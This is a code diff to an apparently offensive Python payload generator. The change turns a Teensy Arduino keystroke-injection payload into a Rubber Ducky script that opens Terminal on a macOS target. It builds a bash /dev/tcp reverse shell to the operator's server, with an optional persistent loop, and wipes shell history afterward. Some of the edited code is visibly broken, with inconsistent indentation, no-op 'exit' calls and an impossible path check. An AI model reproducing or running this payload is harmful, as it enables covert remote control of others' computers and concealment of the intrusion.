@@ -23,66 +23,62 @@ import os, time
 
 class payload:
 	def __init__(self):
-		self.name = "Teensy macOS payload"
-		self.description = "Arduino payload that replicates keystrokes for shell script execution."
-		self.usage = "Install via arduino."
+		self.name = "Duck macOS payload"
+		self.description = "Rubber Ducky payload that replicates keystrokes for shell script execution."
+		self.usage = "Install via ducktoolkit.com site."
 
 	def run(self,server):
 		while 1:
-			persistence = raw_input(h.info_question_raw("Make Persistent? (y/N): ")).strip(" ").lower()
+			shell = raw_input(h.info_general_raw("Target Shell: ")).strip(" ")
+			persistence = raw_input(h.info_question_raw("Make Persistent? (y/n): ")).strip(" ").lower()
 			if persistence == "y":
 				shell_command = "while true; do $("+shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1); sleep 5; done & "
-				break
-			elif persistence == "n" or not persistence:
-				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
+				shell_clean = "history -wc;killall Terminal"
 				break
 			else:
-				h.info_error("Unrecognized option!")
-
+				shell_command = shell+" &> /dev/tcp/"+str(server.host)+"/"+str(server.port)+" 0>&1;"
+				shell_clean = "history -wc;killall Terminal"
+				break
 		shell_command += "history -wc;killall Terminal"
-		if os.path.exists("payloads") == False:
-			os.mkdir("payloads")
-		if os.path.exists("payloads/teensy_macos") == False:
-			os.mkdir("payloads/teensy_macos")
-		payload_save_path = "payloads/teensy_macos/teensy_macos.ino"
+		path = raw_input(h.info_general_raw("Output File: ")).strip(" ")
+		w = os.environ['OLDPWD']
+                os.chdir(w)
+		if os.path.isdir(path):
+		    if os.path.exists(path):
+			if path[:-1] == "/":
+			    payload_save_path = path + "payload.txt"
+			else:
+			    payload_save_path = path + "/payload.txt"
+		    else:
+			h.info_error("Local directory: "+path+": does not exist!")
+			exit
+		else:
+		    direct = os.path.split(path)[0]
+		    if os.path.exists(direct):
+			if os.path.isdir(direct):
+		            payload_save_path = path
+			else:
+			    h.info_error("Error: "+direct+": not a directory!")
+			    exit
+		    else:
+		        h.info_error("Local directory: "+direct+": does not exist!")
+		        exit
 		payload = """\
-#include "Keyboard.h"
-const int LED = 13;
-void setup() {
-	pinMode(LED, OUTPUT);
-	Serial.begin(9600);
-	delay(1000); //delay to establish connection
-	Keyboard.set_modifier(MODIFIERKEY_GUI);
-	Keyboard.set_key1(KEY_SPACE);
-	Keyboard.send_now();
-	Keyboard.set_modifier(0);
-	Keyboard.set_key1(0);
-	Keyboard.send_now();
-	delay(200);
-	Keyboard.print("terminal");
-	delay(1000);
-	keyEnter();
-	delay(1000);
-	Keyboard.print(\""""+shell_command+"""\");
-	keyEnter();
-}
-
-void keyEnter() {
-	Keyboard.set_key1(KEY_ENTER);
-	Keyboard.send_now();
-	//release
-	Keyboard.set_key1(0);
-	Keyboard.send_now();
-}
-
-void loop() {
-	digitalWrite(LED, HIGH);
-	delay(100);
-	digitalWrite(LED, LOW);
-	delay(100);
-}"""
+DELAY 500
+COMMAND SPACE
+DELAY 500
+STRING terminal
+DELAY 500
+ENTER
+DELAY 500
+STRING """+shell_command+"""
+DELAY 500
+ENTER
+DELAY 500"""
+		h.info_general("Saving to " + payload_save_path + "...")
 		f = open(payload_save_path,"w")
 		f.write(payload)
 		f.close()
-		h.info_general("Payload saved to " + payload_save_path)
-
+		h.info_success("Saved to " + payload_save_path + "!")
+		g = os.environ['HOME']
+                os.chdir(g + "/mouse")
